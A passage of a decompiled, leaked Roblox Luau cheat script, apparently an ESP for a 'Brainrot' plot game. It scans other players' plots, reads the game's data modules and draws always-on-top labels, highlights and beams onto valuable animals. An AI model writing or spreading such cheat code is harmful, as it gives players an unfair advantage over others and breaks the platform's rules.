				flag285 = false
				if not flag284 or flag290 ~= n7 then
					return
				end
				local tbl90 = tbl88
				local value307 = n8
				tbl88 = {}
				n8 = 0

				for i_ = 1, value307 do
					local entry26 = tbl90[i_]

					if entry26 and entry26.Parent then
						func441(entry26)
					end
				end
			end)
		end

		local function func449()
			n7 += 1
			local flag291 = n7

			task.spawn(function()
				local children = plots:GetChildren()
				local n9 = 1

				while flag284 and flag291 == n7 and n9 <= #children do
					local now = os.clock()

					while true do
						local entry27 = children[n9]
						n9 += 1

						if entry27 then
							func441(entry27)

							for _, child in ipairs(entry27:GetChildren()) do
								children[#children + 1] = child
							end
						end

						if not (n9 > #children or os.clock() - now >= n6) then
							continue
						end
						break
					end

					if n9 <= #children then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end

		local function func450()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			if not plots then
				return
			end

			connection = plots.DescendantAdded:Connect(function(descendant)
				if flag284 then
					func448(descendant)
				end
			end)

			func449()
		end

		local function func451()
			flag284 = false
			n7 += 1

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			func442()
		end

		local function func452()
			func451()
			flag284 = true
			plots = Workspace:FindFirstChild("Plots")
			if plots then
				func450()
				return
			end

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if flag284 and child.Name == "Plots" then
					plots = child

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					func450()
				end
			end)
		end

		local function func453()
			local yourBaseClear = tbl43.YourBaseClear == true

			if yourBaseClear and not flag284 then
				func452()
			elseif not yourBaseClear and flag284 then
				func451()
			end
		end

		func250(function(flag292)
			if flag292 == "YourBaseClear" then
				func453()
			end
		end)

		func453()
		bindableEvent.Event:Connect(func451)
		folder.Destroying:Connect(func451)
	end

	chilliBrainrotESPRuntime, value289 = func245("__ChilliBrainrotESPRuntime")
	local font
	font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	local list68
	list68 = {}
	local tbl91
	tbl91 = { Limit = 1000000, Outline = Color3.fromRGB(255, 232, 152) }

	do
		local colorSequence = ColorSequence.new
		local value308 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
		local value309 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		local tbl92 = { value308, value309 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl92)
		end

		tbl91.Text = colorSequence(tbl92)
	end

	do
		local colorSequence = ColorSequence.new
		local value310 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local value311 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local new = ColorSequenceKeypoint.new
		local color2 = Color3.fromRGB
		local tbl93 = { value310, value311 }

		do
			local values = table.pack(new(1, color2(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl93)
		end

		tbl91.Stroke = colorSequence(tbl93)
	end

	local tbl94
	tbl94 = { Limit = 10000000, Outline = Color3.fromRGB(255, 194, 112) }

	do
		local colorSequence = ColorSequence.new
		local value312 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local value313 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		local tbl95 = { value312, value313 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl95)
		end

		tbl94.Text = colorSequence(tbl95)
	end

	do
		local colorSequence = ColorSequence.new
		local value314 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
		local value315 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
		local tbl96 = { value314, value315 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl96)
		end

		tbl94.Stroke = colorSequence(tbl96)
	end

	local tbl97
	tbl97 = { Limit = 100000000, Outline = Color3.fromRGB(255, 160, 132) }

	do
		local colorSequence = ColorSequence.new
		local value316 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
		local value317 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		local tbl98 = { value316, value317 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(196, 42, 0)))
			table.move(values, 1, values.n, 3, tbl98)
		end
		-- more leaks: https://discord.gg/x7YbZeezpm

		tbl97.Text = colorSequence(tbl98)
	end

	do
		local colorSequence = ColorSequence.new
		local value318 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
		local value319 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
		local tbl99 = { value318, value319 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl99)
		end

		tbl97.Stroke = colorSequence(tbl99)
	end

	do
		local tbl100 = { Limit = math.huge, Outline = Color3.fromRGB(255, 128, 138) }
		local colorSequence = ColorSequence.new
		local value320 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local value321 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		local tbl101 = { value320, value321 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl101)
		end

		tbl100.Text = colorSequence(tbl101)
		local colorSequence2 = ColorSequence.new
		local value322 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local value323 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		local tbl102 = { value322, value323 }

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 0, 3)))
			table.move(values, 1, values.n, 3, tbl102)
		end

		tbl100.Stroke = colorSequence2(tbl102)
		list68[1] = tbl91
		list68[2] = tbl94
		list68[3] = tbl97
		list68[4] = tbl100
	end

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Animals)
		end)

		byName4 = ok and type(result) == "table" and result or {}
	end

	local tbl103

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Rarities)
		end)

		tbl103 = ok and type(result) == "table" and result or {}
	end

	local flag293, func454

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Mutations)
		end)

		local tbl104 = ok and type(result) == "table" and result or {}

		local ok2, result2 = pcall(function()
			return require(ReplicatedStorage.Packages.Gradients)
		end)

		flag293 = ok2 and type(result2) == "table" and result2 or nil
		local tbl105 = {}

		local ok3, result3 = pcall(function()
			return require(ReplicatedStorage.Datas.Traits)
		end)

		local tbl106 = ok3 and type(result3) == "table" and result3 or {}

		for k, value324 in pairs(tbl106) do
			if type(value324) == "table" then
				value324.TraitKey = k

				if value324.Icon then
					local icon2 = tostring(value324.Icon)
					tbl105[icon2] = value324
					local match = icon2:match("%d+")

					if match then
						tbl105[match] = value324
					end
				end
			end
		end

		flag262 = false
		list65 = {}
		tbl82 = {}
		n2 = 1
		flag263 = false
		flag264 = false
		n3 = 1000000
		flag265 = { Name = true, Mutation = true, Value = true, Trails = true, Rarity = false }

		tbl83 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
		}

		func454 = function(flag294)
			for _, item64 in ipairs(list68) do
				if flag294 < item64.Limit then
					return item64
				end
			end

			return list68[#list68]
		end

		local function func455(param127)
			local entry28 = byName4[param127]
			if type(entry28) == "table" and entry28.Rarity then
				return tostring(entry28.Rarity)
			end
			return nil
		end

		local function func456(num44)
			if num44 >= 1e9 then
				return string.format("$%.2fB/s", num44 / 1e9)
			end

			if num44 >= 1000000 then
				return string.format("$%.2fM/s", num44 / 1000000)
			end

			if num44 >= 1000 then
				return string.format("$%.1fK/s", num44 / 1000)
			end
			return string.format("$%d/s", math.floor(num44))
		end

		local function func457(param128, part21)
			local debris = Workspace:FindFirstChild("Debris")
			if not debris then
				return nil
			end
			local value325 = nil
			local value326 = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == param128.Name then
						local magnitude = (child.Position - part21.Position).Magnitude

						if not value325 or magnitude < value325 then
							value325 = magnitude
							value326 = animalOverhead
						end
					end
				end
			end

			if value326 and value325 and value325 <= 14 then
				return value326
			end
			return nil
		end

		local function func458(param129)
			if param129.CachedOverhead and param129.CachedOverhead.Parent then
				return param129.CachedOverhead
			end
			local model2 = func457(param129.Model, param129.Root)
			param129.CachedOverhead = model2
			return model2
		end

		local function func459(param130, param131, flag295)
			local mutation = flag295 or func457(param130, param131)
			mutation = mutation and mutation:FindFirstChild("Mutation")
			if not (mutation and mutation:IsA("TextLabel") and mutation.Visible) then
				return nil
			end
			local str27 = tostring(mutation.Text or "")
			if str27 == "" then
				return nil
			end

			local tbl107 = {
				Text = str27,
				RichText = mutation.RichText == true,
				Color = mutation.TextColor3,
				Font = mutation.FontFace,
				StrokeColor = nil,
				Gradient = nil,
				SourceGrad = mutation:FindFirstChildOfClass("UIGradient"),
			}

			local uiStroke = mutation:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				tbl107.StrokeColor = uiStroke.Color
			end

			if tbl107.SourceGrad then
				tbl107.Gradient = {
					Color = tbl107.SourceGrad.Color,
					Rotation = tbl107.SourceGrad.Rotation,
					Offset = tbl107.SourceGrad.Offset,
				}
			end

			return tbl107
		end

		local function func460(text8)
			if not text8 or text8 == "" then
				return nil
			end
			local match, obj87 = text8:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

			if match then
				local n8 = tonumber(match) or 0
				local flag296 = obj87:upper()

				if flag296 == "K" then
					n8 *= 1000
				elseif flag296 == "M" then
					n8 *= 1000000
				elseif flag296 == "B" then
					n8 *= 1e9
				elseif flag296 == "T" then
					n8 *= 1e12
				end

				return n8
			end

			return nil
		end

		local function func461(param132, flag297, list69, param133)
			local entry29 = byName4[param132]
			local n8 = type(entry29) == "table" and tonumber(entry29.Generation) or 0
			if n8 <= 0 then
				return func460(param133) or 0
			end
			local value327 = flag297 and tbl104 and tbl104[flag297]
			local n9 = 1

			if value327 then
				n9 = 1 + (tonumber(tbl104[flag297].Modifier) or 0)
			end

			local value328 = list69 and tbl106
			local flag298 = false

			if value328 then
				for _, item65 in ipairs(list69) do
					local value329 = tbl106[item65] or tbl106[item65:gsub("_", " ")]

					if value329 then
						if item65 == "Sleepy" or value329.Name == "Sleepy" then
							flag298 = true
						else
							n9 += tonumber(value329.MultiplierModifier) or 0
						end
					end
				end
			end

			local num45 = math.round(n8 * n9 * (flag298 and 0.5 or 1))
			local flag299 = func460(param133)
			if flag299 and flag299 > num45 then
				return flag299
			end
			return num45 > 0 and num45 or flag299 or n8
		end

		local function func462(instance70, param134, flag300)
			local tbl108 = {}
			local tbl109 = {}
			local tbl110 = {}
			local tbl111 = {}

			local function func463(flag301, flag302)
				if flag301 and not tbl111[flag301] then
					tbl111[flag301] = true
					table.insert(tbl109, flag301)
				end

				if flag302 and flag302 ~= "" and flag302 ~= "rbxassetid://110835412437000" then
					local match = tostring(flag302):match("%d+")
					local str28 = match or tostring(flag302)

					if not tbl110[str28] then
						tbl110[str28] = true
						local str29 = tostring(flag302)

						if not str29:find("://") and match then
							str29 = "rbxassetid://" .. match
						end

						table.insert(tbl108, str29)
					end
				end
			end

			local traits = flag300 or func457(instance70, param134)
			traits = traits and traits:FindFirstChild("Traits")

			if traits and traits.Visible then
				for _, child in ipairs(traits:GetChildren()) do
					if child:IsA("ImageLabel") and child.Visible and child.Image and child.Image ~= "" then
						local image2 = tostring(child.Image)
						local match = image2:match("%d+")
						local traitKey = tbl105[image2] or match and tbl105[match]

						if traitKey then
							traitKey = traitKey.TraitKey or traitKey.Display or traitKey.Name
						end

						func463(traitKey, child.Image)
					end
				end
			end

			for _, child in ipairs(instance70:GetChildren()) do
				local match = child.Name:match("^_Trait%.(.+)$")

				if match then
					local flag303 = tbl106[match] or tbl106[match:gsub("_", " ")]
					func463(match, flag303 and flag303.Icon)
				end
			end

			local attribute = instance70:GetAttribute("Trait") or instance70:GetAttribute("Traits")

			if attribute then
				local str30 = tostring(attribute)
				local flag304 = tbl106[str30] or tbl106[str30:gsub("_", " ")]
				func463(str30, flag304 and flag304.Icon)
			end

			return #tbl108 > 0 and tbl108 or nil, #tbl109 > 0 and tbl109 or nil
		end

		func401 = function(instance71)
			return instance71:FindFirstChild("RootPart") or instance71.PrimaryPart or instance71:FindFirstChildWhichIsA("BasePart")
		end

		local function func464(parent, layoutOrder, param135)
			local frame = Instance.new("Frame")
			frame.BackgroundTransparency = 1
			frame.LayoutOrder = layoutOrder
			frame.Size = UDim2.new(1, 0, 0, param135)
			frame.Parent = parent
			local textLabel = Instance.new("TextLabel")
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font
			textLabel.Position = UDim2.fromOffset(1, 1)
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.Text = ""
			textLabel.TextColor3 = Color3.fromRGB(12, 0, 2)
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextTransparency = 0.1
			textLabel.ZIndex = 2
			textLabel.Parent = frame
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.BackgroundTransparency = 1
			textLabel2.FontFace = font
			textLabel2.Size = UDim2.fromScale(1, 1)
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel2.TextScaled = true
			textLabel2.TextStrokeTransparency = 1
			textLabel2.ZIndex = 3
			textLabel2.Parent = frame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = Color3.fromRGB(0, 0, 0)
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round

			uiStroke.Thickness = pcall(function()
				uiStroke.BorderOffset = UDim.new(0, 0)
				uiStroke.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end) and 0.05 or 1.6

			uiStroke.Transparency = 0.05
			uiStroke.Parent = textLabel2
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Rotation = 90
			uiGradient.Enabled = false
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Rotation = 90
			uiGradient2.Enabled = false
			uiGradient2.Parent = textLabel2
			return { Holder = frame, Label = textLabel2, Shadow = textLabel, Stroke = uiStroke, StrokeGradient = uiGradient, TextGradient = uiGradient2 }
		end

		local function func465(parent, layoutOrder, param136)
			local frame = Instance.new("Frame")
			frame.Name = "TraitRow"
			frame.BackgroundTransparency = 1
			frame.LayoutOrder = layoutOrder
			frame.Size = UDim2.new(1, 0, 0, param136)
			frame.Parent = parent
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.Padding = UDim.new(0, 3)
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = frame
			return { Holder = frame, Layout = uiListLayout, Icons = {}, CurrentKey = "" }
		end

		func402 = function(adornee, adornee2)
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "BrainrotTag"
			billboardGui.Adornee = adornee2
			billboardGui.AlwaysOnTop = true
			billboardGui.ClipsDescendants = false
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = math.huge
			billboardGui.Size = UDim2.fromOffset(220, 95)
			billboardGui.StudsOffsetWorldSpace = Vector3.new(0, 4.4, 0)
			billboardGui.Parent = adornee2
			local frame = Instance.new("Frame")
			frame.BackgroundTransparency = 1
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Vertical
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
			uiListLayout.Parent = frame
			local obj88 = func457(adornee, adornee2)
			local text = obj88 and obj88:FindFirstChild("Generation") and obj88.Generation.Text
			local text2 = obj88 and obj88:FindFirstChild("Mutation") and obj88.Mutation.Visible and obj88.Mutation.Text

			if not text2 then
				local attribute = adornee:GetAttribute("Mutation") or adornee:GetAttribute("__mutation")

				if attribute and tostring(attribute) ~= "" then
					text2 = tostring(attribute)
				end
			end

			local value330, value331 = func462(adornee, adornee2)
			local name3 = func461(adornee.Name, text2, value331, text)

			local tbl112 = {
				Model = adornee,
				Root = adornee2,
				Billboard = billboardGui,
				Column = frame,
				RarityRow = func464(frame, 0, 16),
				TraitRow = func465(frame, 1, 18),
				MutationRow = func464(frame, 2, 15),
				NameRow = func464(frame, 3, 19),
				ValueRow = func464(frame, 4, 16),
				Name = adornee.Name,
				Generation = name3,
			}

			tbl112.RarityRow.Label.RichText = true
			tbl112.MutationRow.Label.RichText = true
			tbl112.RarityRow.Holder.Visible = false
			tbl112.TraitRow.Holder.Visible = false
			local generation4 = func454(tbl112.Generation)
			tbl112.NameRow.TextGradient.Color = generation4.Text
			tbl112.NameRow.TextGradient.Enabled = true
			tbl112.NameRow.StrokeGradient.Color = generation4.Stroke
			tbl112.NameRow.StrokeGradient.Enabled = true
			tbl112.ValueRow.TextGradient.Enabled = false
			tbl112.ValueRow.StrokeGradient.Enabled = false
			tbl112.ValueRow.Label.TextColor3 = Color3.fromRGB(115, 255, 0)
			tbl112.ValueRow.Shadow.TextColor3 = Color3.fromRGB(18, 48, 0)
			tbl112.ValueRow.Stroke.Transparency = 0.3
			tbl112.NameRow.Label.Text = tbl112.Name
			tbl112.NameRow.Shadow.Text = tbl112.Name
			local generation5 = func456(tbl112.Generation)
			tbl112.ValueRow.Label.Text = generation5
			tbl112.ValueRow.Shadow.Text = generation5
			local highlight2 = Instance.new("Highlight")
			highlight2.Name = "BrainrotHighlight"
			highlight2.Adornee = adornee
			highlight2.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight2.FillColor = generation4.Outline
			highlight2.FillTransparency = 0.86
			highlight2.OutlineColor = generation4.Outline
			highlight2.OutlineTransparency = 0.3
			highlight2.Enabled = false
			highlight2.Parent = adornee
			tbl112.Highlight = highlight2
			tbl112.BeamTint = generation4.Outline
			return tbl112
		end

		func403 = function(list70)
			local floor = math.floor
			local n8 = 95 * n2
			list70.Billboard.Size = UDim2.fromOffset(math.floor(220 * n2), floor(n8))
			list70.RarityRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * n2))
			local n9 = math.floor(18 * n2)
			list70.TraitRow.Holder.Size = UDim2.new(1, 0, 0, n9)

			for _, icon in ipairs(list70.TraitRow.Icons) do
				icon.Size = UDim2.fromOffset(n9, n9)
			end

			list70.MutationRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(15 * n2))
			list70.NameRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(19 * n2))
			list70.ValueRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * n2))
		end

		local function func466(param137)
			if param137.RarityGradientCleanup then
				pcall(param137.RarityGradientCleanup)
				param137.RarityGradientCleanup = nil
			end

			param137.ActiveRarityEffect = nil
			param137.SourceRarityGrad = nil
			param137.SourceMutationGrad = nil
		end

		func404 = function(param138, num46)
			pcall(function()
				if not flag265.Mutation then
					param138.MutationShown = false
					param138.MutationRow.Holder.Visible = false
					return
				end

				if num46 < (param138.MutationCheckedAt or 0) then
					param138.MutationRow.Holder.Visible = param138.MutationShown == true
					return
				end
				param138.MutationCheckedAt = num46 + 0.4
				local model3 = func459(param138.Model, param138.Root, func458(param138))

				if not model3 then
					param138.MutationShown = false
					param138.MutationRow.Holder.Visible = false
					param138.SourceMutationGrad = nil
					return
				end

				param138.MutationShown = true
				local mutationRow = param138.MutationRow
				mutationRow.Holder.Visible = true
				mutationRow.Label.RichText = model3.RichText
				mutationRow.Label.Text = model3.Text

				if model3.Color then
					mutationRow.Label.TextColor3 = model3.Color
				end

				if model3.Font then
					pcall(function()
						mutationRow.Label.FontFace = model3.Font
						mutationRow.Shadow.FontFace = model3.Font
					end)
				end

				if model3.StrokeColor then
					mutationRow.Stroke.Color = model3.StrokeColor
				end

				if model3.Gradient then
					pcall(function()
						mutationRow.TextGradient.Color = model3.Gradient.Color
						mutationRow.TextGradient.Rotation = model3.Gradient.Rotation
						mutationRow.TextGradient.Offset = model3.Gradient.Offset
						mutationRow.TextGradient.Enabled = true
					end)

					param138.SourceMutationGrad = model3.SourceGrad
				else
					mutationRow.TextGradient.Enabled = false
					param138.SourceMutationGrad = nil
				end

				mutationRow.Shadow.RichText = false
				mutationRow.Shadow.Text = model3.Text:gsub("<[^<>]->", "")
			end)
		end

		func405 = function(param139, num47)
			if not flag265.Rarity then
				param139.RarityShown = false
				param139.RarityRow.Holder.Visible = false
				func466(param139)
				return
			end

			if num47 < (param139.RarityCheckedAt or 0) then
				param139.RarityRow.Holder.Visible = param139.RarityShown == true
				return
			end
			param139.RarityCheckedAt = num47 + 0.5
			local text = func455(param139.Model.Name)
			local obj89 = func458(param139)
			local rarity = obj89 and obj89:FindFirstChild("Rarity")

			if rarity and rarity:IsA("TextLabel") and rarity.Visible and rarity.Text ~= "" then
				text = rarity.Text
			end

			if not text or text == "" then
				param139.RarityShown = false
				param139.RarityRow.Holder.Visible = false
				func466(param139)
				return
			end

			param139.RarityShown = true
			local rarityRow = param139.RarityRow
			rarityRow.Holder.Visible = true
			rarityRow.Label.Text = text
			rarityRow.Shadow.Text = text:gsub("<[^<>]->", "")
			local gradientPreset = tbl103[text]
			gradientPreset = gradientPreset and gradientPreset.GradientPreset
			local flag305 = false

			pcall(function()
				if gradientPreset and flag293 and flag293.apply then
					if param139.ActiveRarityEffect ~= gradientPreset then
						if param139.RarityGradientCleanup then
							pcall(param139.RarityGradientCleanup)
							param139.RarityGradientCleanup = nil
						end

						param139.ActiveRarityEffect = gradientPreset

						local ok4, rarityGradientCleanup = pcall(function()
							return flag293.apply(rarityRow.Label, gradientPreset)
						end)

						if ok4 and typeof(rarityGradientCleanup) == "function" then
							param139.RarityGradientCleanup = rarityGradientCleanup
						end
					end

					pcall(function()
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
					end)

					param139.SourceRarityGrad = nil
					flag305 = true
				end
			end)

			if not flag305 then
				pcall(function()
					if param139.RarityGradientCleanup then
						pcall(param139.RarityGradientCleanup)
						param139.RarityGradientCleanup = nil
					end

					param139.ActiveRarityEffect = nil
					local uiGradient = rarity and rarity:FindFirstChildOfClass("UIGradient")
					local uiStroke = rarity and rarity:FindFirstChildOfClass("UIStroke")

					if uiGradient then
						rarityRow.TextGradient.Color = uiGradient.Color
						rarityRow.TextGradient.Rotation = uiGradient.Rotation
						rarityRow.TextGradient.Offset = uiGradient.Offset
						rarityRow.TextGradient.Enabled = true
						param139.SourceRarityGrad = uiGradient
					else
						rarityRow.TextGradient.Enabled = false
						param139.SourceRarityGrad = nil
					end

					if uiStroke then
						rarityRow.Stroke.Color = uiStroke.Color
					else
						rarityRow.Stroke.Color = Color3.fromRGB(0, 0, 0)
					end

					if rarity and rarity.TextColor3 then
						rarityRow.Label.TextColor3 = rarity.TextColor3
					elseif text == "Mythic" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 0, 0)
					elseif text == "Legendary" or text == "Legend" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 175, 0)
					elseif text == "Epic" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(134, 0, 171)
					elseif text == "Rare" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(0, 131, 171)
					elseif text == "Common" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(0, 171, 40)
					else
						rarityRow.Label.TextColor3 = Color3.fromRGB(130, 210, 255)
					end
				end)
			end
		end

		func406 = function(list71, num48)
			if not flag265.Trails then
				list71.TraitRow.Holder.Visible = false
				return
			end

			if num48 < (list71.TraitCheckedAt or 0) then
				list71.TraitRow.Holder.Visible = list71.TraitIcons ~= nil
				return
			end
			list71.TraitCheckedAt = num48 + 0.5
			local list72, value332 = func462(list71.Model, list71.Root, func458(list71))
			list71.ActiveTraitNames = value332

			if not list72 then
				list71.TraitIcons = nil
				list71.TraitRow.Holder.Visible = false
				list71.TraitRow.CurrentKey = ""

				for _, icon in ipairs(list71.TraitRow.Icons) do
					icon.Visible = false
				end

				return
			end

			list71.TraitIcons = list72
			list71.TraitRow.Holder.Visible = true
			local currentKey = table.concat(list72, "|")

			if list71.TraitRow.CurrentKey ~= currentKey then
				list71.TraitRow.CurrentKey = currentKey
				local n8 = math.floor(18 * n2)

				for i_ = 1, #list72 do
					local imageLabel = list71.TraitRow.Icons[i_]

					if not imageLabel then
						imageLabel = Instance.new("ImageLabel")
						imageLabel.BackgroundTransparency = 1
						imageLabel.ScaleType = Enum.ScaleType.Fit
						imageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255)
						imageLabel.ZIndex = 3
						imageLabel.Parent = list71.TraitRow.Holder
						list71.TraitRow.Icons[i_] = imageLabel
					end

					imageLabel.Image = list72[i_]
					imageLabel.Size = UDim2.fromOffset(n8, n8)
					imageLabel.LayoutOrder = i_
					imageLabel.Visible = true
				end

				for i_ = #list72 + 1, #list71.TraitRow.Icons do
					list71.TraitRow.Icons[i_].Visible = false
				end
			end
		end

		func407 = function(param140, num49)
			if num49 < (param140.GenerationCheckedAt or 0) then
				return
			end
			param140.GenerationCheckedAt = num49 + 0.4
			local mutation = func458(param140)
			local text = mutation and mutation:FindFirstChild("Generation") and mutation.Generation.Text
			mutation = mutation and mutation:FindFirstChild("Mutation")
			local text2

			if mutation and mutation.Visible and mutation.Text ~= "" then
				text2 = mutation.Text
			else
				local attribute = param140.Model:GetAttribute("Mutation") or param140.Model:GetAttribute("__mutation")
				local flag306 = attribute and tostring(attribute) ~= ""
				text2 = nil

				if flag306 then
					text2 = tostring(attribute)
				end
			end

			local activeTraitNames = param140.ActiveTraitNames

			if not activeTraitNames then
				local value333
				value333, activeTraitNames = func462(param140.Model, param140.Root)
				param140.ActiveTraitNames = activeTraitNames
			end

			local name4 = func461(param140.Name, text2, activeTraitNames, text)

			if name4 ~= param140.Generation and name4 > 0 then
				param140.Generation = name4
				local value334 = func456(name4)
				param140.ValueRow.Label.Text = value334
				param140.ValueRow.Shadow.Text = value334
				local value335 = func454(name4)
				param140.NameRow.TextGradient.Color = value335.Text
				param140.NameRow.StrokeGradient.Color = value335.Stroke
				param140.Highlight.FillColor = value335.Outline
				param140.Highlight.OutlineColor = value335.Outline
				param140.BeamTint = value335.Outline
			end
		end

		func408 = function(param141, param142)
			if flag264 then
				return param142
			end
			return (param141.Generation or 0) >= n3
		end

		attachment = nil
		local attachment4 = nil
		local beam3 = nil
		local beam4 = nil
		flag266 = nil
		flag267 = nil

		func409 = function()
			pcall(function()
				if beam3 then
					beam3:Destroy()
				end
			end)

			pcall(function()
				if beam4 then
					beam4:Destroy()
				end
			end)

			pcall(function()
				if attachment then
					attachment:Destroy()
				end
			end)

			pcall(function()
				if attachment4 then
					attachment4:Destroy()
				end
			end)

			beam3 = nil
			beam4 = nil
			attachment = nil
			attachment4 = nil
			flag266 = nil
			flag267 = nil
		end

		func410 = function(parent, parent2)
			func409()
			if not (parent and parent2) then
				return
			end
			attachment = Instance.new("Attachment")
			attachment.Name = "BrainrotBeamStart"
			attachment.Position = Vector3.new(0, 1, 0)
			attachment.Parent = parent
			attachment4 = Instance.new("Attachment")
			attachment4.Name = "BrainrotBeamTarget"
			attachment4.Position = Vector3.new(0, 2.5, 0)
			attachment4.Parent = parent2
			local color2 = Color3.fromRGB(255, 25, 140)
			local color3 = Color3.fromRGB(255, 120, 220)
			local color4 = Color3.fromRGB(180, 35, 255)
			beam3 = Instance.new("Beam")
			beam3.Name = "BrainrotBeamGlow"
			beam3.Attachment0 = attachment
			beam3.Attachment1 = attachment4
			beam3.Color = ColorSequence.new(color2, color4)
			beam3.CurveSize0 = 1.8
			beam3.CurveSize1 = -1.8
			beam3.FaceCamera = true
			beam3.LightEmission = 0.55
			beam3.Segments = 20
			beam3.Transparency = NumberSequence.new(0.65)
			beam3.Width0 = 0.42
			beam3.Width1 = 0.6
			obj[beam3] = true
			beam3.Parent = attachment
			beam4 = Instance.new("Beam")
			beam4.Name = "BrainrotBeamCore"
			beam4.Attachment0 = attachment
			beam4.Attachment1 = attachment4
			local value336 = beam4
			local colorSequence = ColorSequence.new
			local value337 = ColorSequenceKeypoint.new(0, color2)
			local value338 = ColorSequenceKeypoint.new(0.5, color3)
			local new = ColorSequenceKeypoint.new
			local tbl113 = { value337, value338 }

			do
				local values = table.pack(new(1, color4))
				table.move(values, 1, values.n, 3, tbl113)
			end

			value336.Color = colorSequence(tbl113)
			beam4.CurveSize0 = 1.8
			beam4.CurveSize1 = -1.8
			beam4.FaceCamera = true
			beam4.LightEmission = 0.6
			beam4.Segments = 20
			beam4.Transparency = NumberSequence.new(0.04)
			beam4.Width0 = 0.12
